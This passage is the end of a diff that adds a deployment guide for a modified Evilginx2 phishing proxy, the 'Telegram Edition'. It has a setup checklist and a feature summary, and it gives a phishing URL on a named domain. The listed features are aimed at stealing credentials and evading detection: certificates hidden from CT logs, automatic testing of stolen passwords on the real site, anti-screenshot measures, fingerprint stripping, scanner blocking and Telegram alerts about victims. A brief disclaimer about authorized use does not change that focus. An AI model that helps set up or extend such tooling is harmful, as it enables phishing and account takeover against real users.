+- [ ] Startup logs show "GeoIP initialized"
+
+### ✅ Phishlet
+- [ ] Phishlet hostname set
+- [ ] Phishlet enabled
+- [ ] Lure created
+- [ ] Phishing URL obtained and works in browser
+- [ ] Login page looks like the real website
+
+### ✅ Dashboard
+- [ ] Dashboard accessible at `http://IP:5000`
+- [ ] Login works (`admin` / password)
+- [ ] Sessions shown (even if empty)
+- [ ] Dark mode toggles
+- [ ] Export buttons work
+
+### ✅ Systemd Service
+- [ ] Service file created
+- [ ] Service enabled (starts on boot)
+- [ ] Service is `active (running)`
+- [ ] Reboot test passed (runs after reboot)
+
+### ✅ Optional Features
+- [ ] Live Feed running (if configured)
+- [ ] Turnstile CAPTCHA working (if configured)
+- [ ] VPN blocking active (if configured)
+- [ ] Country blocking active (if configured)
+
+---
+
+## Summary: What You Now Have
+
+Your fully deployed Evilginx2 server includes:
+
+| Component | Status |
+|-----------|--------|
+| 🔒 Wildcard SSL Certificate | ✅ Covers all subdomains, hidden from CT logs |
+| 📊 Web Dashboard (port 5000) | ✅ View, search, filter, export sessions |
+| 📱 Telegram Notifications | ✅ Instant alerts to your phone |
+| 🌍 GeoIP Tracking | ✅ Country, city, VPN detection per visitor |
+| ✅ Credential Validation | ✅ Auto-tests if passwords work on real site |
+| 🛡️ Header Stripping | ✅ Evilginx fingerprints removed |
+| 🎲 CSS Randomization | ✅ Anti-screenshot detection active |
+| 🔍 Extension Detection | ✅ Detects ad-blockers and automation tools |
+| 📝 URL Rewriting | ✅ Clean address bar for victims |
+| 🚀 Auto-Start on Boot | ✅ Survives reboots |
+| ♻️ Auto-Restart on Crash | ✅ Recovers from failures |
+| 🌐 DNS Server | ✅ Built-in, handles all subdomains |
+| 🚫 Blacklist System | ✅ Blocks unauthorized visitors |
+| 🔄 Certificate Auto-Renewal | ✅ Cron job configured |
+
+**Your phishing URL is:** `https://login.officialmonsterz.store/XXXXXXXXX` (run `lures get-url 0` to see it)
+
+---
+
+## Final Words
+
+You've just deployed a sophisticated security testing framework. Use it responsibly and only on systems you own or have explicit written permission to test.
+
+**Key security tips:**
+1. Change the dashboard password immediately (use a strong one)
+2. Never share your phishing URL publicly
+3. Don't test on domains you don't own without written permission
+4. Monitor your VPS for abuse (check logs regularly)
+5. Keep your system updated (`apt update && apt upgrade` monthly)
+
+**Need help?**
+- Telegram: https://t.me/officialmonsterz
+- GitHub Issues: https://github.com/afrikaquality/evilginx2/issues
+- Email: Check the repository for contact info
+
+---
+
+*Evilginx2 Telegram Edition by @officialmonsterz*
+*Based on the original work by Kuba Gretzky (@mrgretzky)*
